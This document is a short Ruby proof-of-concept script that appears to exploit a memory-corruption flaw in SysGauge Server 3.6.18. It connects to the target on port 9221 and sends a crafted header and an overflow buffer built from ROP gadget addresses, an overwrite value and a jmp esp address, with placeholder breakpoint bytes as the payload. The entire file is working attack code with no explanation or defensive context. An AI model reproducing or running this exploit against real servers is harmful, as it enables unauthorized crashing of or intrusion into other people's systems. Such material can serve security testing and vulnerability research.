#!/usr/bin/env ruby
# SysGauge Server 3.6.18
require 'rex'

host = ARGV[0]

def usage
 puts "[*] SysGauge Server 3.6.18 PoC"
 puts "[*] #{$0} <host>"
 exit
end

usage if ARGV.size < 1

begin

sock = Rex::Socket::Tcp.create('PeerHost'  => host, 'PeerPort'  => 9221)

payload = "\xcc" * 10

ropnop = [0x1003b68d].pack('V') * 31
jmpesp = [0x1006d18d].pack('V').force_encoding("UTF-8")

buffer = Rex::Text.pattern_create(2023)
buffer[0,ropnop.size] = ropnop.force_encoding("UTF-8")
buffer[124,4] = [0x10014324].pack('V').force_encoding("UTF-8")
buffer[128,4] = [0x10031001].pack('V').force_encoding("UTF-8")
buffer[134, 4 + payload.size] = "AA" + jmpesp + payload.force_encoding("UTF-8")


header =  "\x75\x19\xba\xab"
header << "\x03\x00\x00\x00"
header << "\x00\x40\x00\x00"
header << [buffer.size].pack("I").force_encoding("UTF-8")
header << [buffer.size].pack("I").force_encoding("UTF-8")
header << buffer[-1] + "\x00\x00\x00"
data = header + buffer
sock.write(data)
rescue => e
puts "[!] #{e.to_s}"
end
